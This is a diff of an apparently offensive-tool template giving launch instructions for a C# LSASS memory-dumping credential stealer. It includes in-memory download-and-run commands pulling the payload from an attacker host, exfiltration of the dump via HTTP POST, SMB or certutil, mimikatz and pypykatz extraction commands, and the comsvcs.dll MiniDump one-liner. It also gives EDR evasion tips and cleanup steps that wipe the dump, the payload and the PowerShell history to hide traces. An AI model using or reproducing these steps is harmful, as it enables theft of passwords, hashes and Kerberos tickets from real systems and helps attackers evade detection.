@@ -58,72 +58,41 @@ output:
     enabled: true
     command: "mcs -out:{{ output_path }}/{{ output_file }} -platform:x64 {{ source_file }}"
   launch_instructions: |
-    C# LSASS MiniDump Credential Dumper - Launch Instructions
+    LSASS MiniDump Credential Dumper - Launch Instructions
 
-    Prerequisites:
+    Step 1: Execute Dumper on Target
 
-    - Administrator privileges or SeDebugPrivilege required
-    - Target must be Windows (LSASS is Windows-only)
-    - DbgHelp.dll must be present (included in Windows by default)
+    In-memory execution (no file drop):
+    $data = (New-Object System.Net.WebClient).DownloadData('http://YOUR_IP/{{ output_file }}')
+    $assem = [System.Reflection.Assembly]::Load($data)
+    [Program]::Main("{{ dump_path }}".Split())
 
-    Step 1: Transfer Payload to Target
+    Traditional execution:
+    Invoke-WebRequest -Uri "http://YOUR_IP/{{ output_file }}" -OutFile "{{ output_file }}"; .\{{ output_file }}
 
-    Transfer the generated executable to the target Windows system:
+    With custom dump path:
+    Invoke-WebRequest -Uri "http://YOUR_IP/{{ output_file }}" -OutFile "{{ output_file }}"; .\{{ output_file }} C:\\Temp\\lsass_backup.dmp
 
-    Using Python HTTP server:
-    python3 -m http.server 8080
+    Step 2: Extract Credentials
 
-    On target (PowerShell as Admin):
-    Invoke-WebRequest -Uri "http://YOUR_IP:8080/{{ output_file }}" -OutFile "{{ output_file }}"
+    On attacker machine (Linux with pypykatz):
+    pypykatz lsa minidump lsass.dmp
 
-    Step 2: Execute Dumper
-
-    Run with default output path:
-    {{ output_file }}
-
-    Or specify custom output path:
-    {{ output_file }} C:\\Temp\\lsass_backup.dmp
-
-    Step 3: Transfer Dump File to Attacker Machine
-
-    From target (PowerShell):
-    Invoke-WebRequest -Uri "http://YOUR_IP:8080/upload" -Method POST -InFile "{{ dump_path }}"
-
-    Or using SMB:
-    On attacker: impacket-smbserver share . -smb2support
-    On target: copy {{ dump_path }} \\YOUR_IP\share\lsass.dmp
-
-    Or exfiltrate via base64:
-    certutil -encode {{ dump_path }} lsass_b64.txt
-    [Copy contents and decode on attacker machine]
-
-    Step 4: Extract Credentials with Mimikatz
-
-    On attacker machine (Windows):
+    On attacker machine (Windows with Mimikatz):
     mimikatz.exe
     sekurlsa::minidump lsass.dmp
     sekurlsa::logonPasswords full
 
-    Or with pypykatz (Linux):
-    pypykatz lsa minidump lsass.dmp
-
     Notes:
 
+    - Requires Administrator privileges or SeDebugPrivilege
     - Default dump path: {{ dump_path }}
-    - Dump file is typically 50-200 MB in size
-    - Requires admin rights or SeDebugPrivilege
+    - Dump file size: typically 50-200 MB
     - HEAVILY monitored by EDR/AV (high detection rate)
-    - Consider obfuscation, process cloning, or indirect syscalls for evasion
-    - Sysmon will log ProcessAccess events to LSASS
+    - DbgHelp.dll must be present (included in Windows by default)
+    - Sysmon logs ProcessAccess events (Event ID 10) to LSASS
     - Windows Defender often blocks direct LSASS access
-
-    Extracted Credentials Include:
-
-    - Plaintext passwords (if WDigest enabled)
-    - NTLM hashes
-    - Kerberos tickets (TGT/TGS)
-    - Domain cached credentials
-    - LM hashes (older systems)
+    - Extracted credentials: plaintext passwords (if WDigest enabled), NTLM hashes, Kerberos tickets, domain cached credentials
 
     Evasion Tips:
 
@@ -131,20 +100,20 @@ output:
     - Implement syscalls to bypass userland hooks
     - Dump from Volume Shadow Copy instead
     - Use PPLdump for Protected Process Light bypass
-    - Consider comsvcs.dll method: rundll32.exe C:\\windows\\System32\\comsvcs.dll, MiniDump [LSASS_PID] C:\\temp\\lsass.dmp full
+    - Alternative method: rundll32.exe C:\\windows\\System32\\comsvcs.dll, MiniDump [LSASS_PID] C:\\temp\\lsass.dmp full
 
     Troubleshooting:
 
-    - Access Denied: Run as Administrator
+    - Access Denied: Run as Administrator or obtain SeDebugPrivilege
     - File creation fails: Check disk space and path permissions
     - No credentials extracted: LSASS may be protected (PPL)
     - EDR blocks: This is expected; technique is well-known
 
     Cleanup:
 
-    After extraction, securely delete dump file:
+    Securely delete dump file and payload:
     sdelete64 -p 7 {{ dump_path }}
-
-    Or simply:
     Remove-Item {{ dump_path }} -Force
     Remove-Item {{ output_file }} -Force
+    Clear-History
+    Remove-Item (Get-PSReadlineOption).HistorySavePath -Force
